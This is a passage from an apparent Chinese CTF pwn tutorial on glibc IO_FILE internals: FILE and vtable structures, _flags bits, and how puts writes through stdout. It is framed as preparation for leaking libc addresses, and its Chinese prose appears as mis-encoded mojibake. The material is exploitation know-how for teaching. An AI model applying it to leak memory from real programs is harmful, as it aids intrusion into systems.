class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In libio/libio.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdin_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdout_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stderr_</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// In libio/libioP.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸ªvtableï¼Œå®é™…ä¸Šè¿™å°±æ˜¯è™šè¡¨ï¼ŒæŒ‡å‘ä¸€ç³»åˆ—çš„å‡½æ•°ï¼Œç›®å‰ä¸ç”¨ç®¡è¿™ä¸ªã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆçœ‹çœ‹FILEç±»å‹ï¼ˆå®é™…ä¸Šä¹Ÿå°±æ˜¯<code>_IO_FILE</code>ï¼‰çš„å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In libio/bits/types/FILE.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// In libio/bits/types/struct_FILE.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// pass</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>_flagsçš„è§„åˆ™ï¼š</strong></p><p>iofileé‡Œé¢çš„ç¬¬ä¸€ä¸ªæˆå‘˜_flagsåœ¨æ³„éœ²libcæ—¶éå¸¸é‡è¦ã€‚flagså ç”¨4ä¸ªå­—èŠ‚ï¼Œé«˜äºŒä¸ªå­—èŠ‚ç”±libcç‰ˆæœ¬æ¥ç¡®å®šï¼Œä¸€èˆ¬éƒ½æ˜¯0xfbad0000ã€‚ä½ä¸¤ä¸ªå­—èŠ‚åˆ™æ˜¯å†³å®šäº†ç¨‹åºçš„æ‰§è¡ŒçŠ¶æ€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Magic number and bits for the _flags field.  The magic number is</span></span><br><span class="line"><span class="comment">   mostly vestigial, but preserved for compatibility.  It occupies the</span></span><br><span class="line"><span class="comment">   high 16 bits of _flags; the low 16 bits are actual flag bits.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS          0x0004 <span class="comment">/* Reading not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES         0x0008 <span class="comment">/* Writing not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN          0x0010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN          0x0020</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="comment">/* Don&#x27;t call close(_fileno) on close.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED            0x0080 <span class="comment">/* In the list of all open files.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP         0x0100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF          0x0200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="comment">/* Put and get pointer move in unison.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING      0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF        0x2000</span></span><br><span class="line">                           <span class="comment">/* 0x4000  No longer used, reserved for compat.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK         0x8000</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢ç¨‹åºæ˜¯é€šè¿‡ä¸è¿ç®—æ¥åˆ¤æ–­åº”è¯¥å¦‚ä½•æ‰§è¡Œï¼š</p><p>æ¯”å¦‚flagé€šå¸¸æƒ…å†µä¸‹å¯èƒ½éƒ½ä¼šæ˜¯<code>_flags=_IO_MAGIC ^ _IO_IS_FILEBUF ^ _IO_CURRENTLY_PUTTING ^ _IO_LINKED ^ _IO_NO_WRITES ^ _IO_UNBUFFERED ^ _IO_USER_BUF  </code> ä¹Ÿå°±æ˜¯ 0xFBAD2887</p><p>é‚£ä¹ˆå¯ä»¥ç”¨_flag &amp; _IO_LINKED æ¥åˆ¤æ–­æ˜¯å¦æœ‰è¿™ä¸€ä½</p><p><strong>putså‡½æ•°æœºåˆ¶ï¼š</strong></p><p>åœ¨ææ¸…æ¥šæˆ‘ä»¬è¦æ‹¿äº›æ ‡å¿—ä½å‰æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹putsçš„æœºåˆ¶ï¼ˆæ¯•ç«Ÿæˆ‘ä»¬æ€»è¦æœ‰ä¸ªè¾“å‡ºçš„å‡½æ•°ï¼‰ï¼Œåœ¨çœ‹putsæºç ä¹‹å‰è¦å…ˆè¡¥å……ä¸€ç‚¹ï¼š</p><blockquote><p>  åœ¨libio&#x2F;ioputs.cä¸­ä½¿ç”¨ <code>weak_alias(_IO_puts, puts)</code> åˆ›å»ºäº†ä¸€ä¸ªå¼±ç¬¦å·ï¼Œå®é™…ä¸Šè°ƒç”¨putså°±æ˜¯åœ¨è°ƒç”¨_IO_putsï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—çœ‹io_putsçš„æºç ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In libio/ioputs.c</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span><span class="comment">// å°±æ˜¯ stdout-&gt;_vtable_offset != 0, ä¸ç”¨ç®¡</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹çœ‹_IO_sputnè¿™ä¸ªå®ï¼Œä¼šå‘ç°æ˜¯è·³è½¬åˆ°äº†è™šå‡½æ•°è¡¨çš„<code>__xsputn</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In libio/libioP.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)<span class="comment">// line379</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)<span class="comment">// line176</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)<span class="comment">// line125</span></span></span><br></pre></td></tr></table></figure><p>ç”¨pwndbgè°ƒä¸€ä¸‹å‘ç°<code>__xsputn</code>æŒ‡å‘çš„æ˜¯ä¸€ä¸ªå«<code>_IO_new_file_xsputn</code>çš„å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_file_jumps</span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">...</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7e493d0</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_fwideæœ‰ä¸€ä¸ªå®çš„å®šä¹‰å’Œä¸€ä¸ªå‡½æ•°çš„å®šä¹‰ï¼Œæˆ‘ä»¬ä¸»è¦å°±çœ‹å‡½æ•°çš„å®šä¹‰å°±è¡Œäº†ï¼Œå¯ä»¥å‘ç°åœ¨è¿™é‡Œä¼šæŠŠIOwrite_ptræ”¹ä¸ºIOwrite_baseçš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Return orientation of stream.  If mode is nonzero try to change</span></span><br><span class="line"><span class="comment">   the orientation first.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_fwide</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fwide (FILE *fp, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/// pass</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the orientation appropriately.  */</span></span><br><span class="line">  <span class="keyword">if</span> (mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/// pass</span></span><br></pre></td></tr></table></figure><p><code>_IO_putc_unlocked</code>  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In libio/libio.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_putc_unlocked(_ch, _fp) __putc_unlocked_body (_ch, _fp)</span></span><br><span class="line"><span class="comment">// In libio/bits/types/struct_FILE.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __putc_unlocked_body(_ch, _fp)\</span></span><br><span class="line"><span class="meta">  (__glibc_unlikely ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)\</span></span><br><span class="line"><span class="meta">   ? __overflow (_fp, (unsigned char) (_ch))\</span></span><br><span class="line"><span class="meta">   : (unsigned char) (*(_fp)-&gt;_IO_write_ptr++ = (_ch)))</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
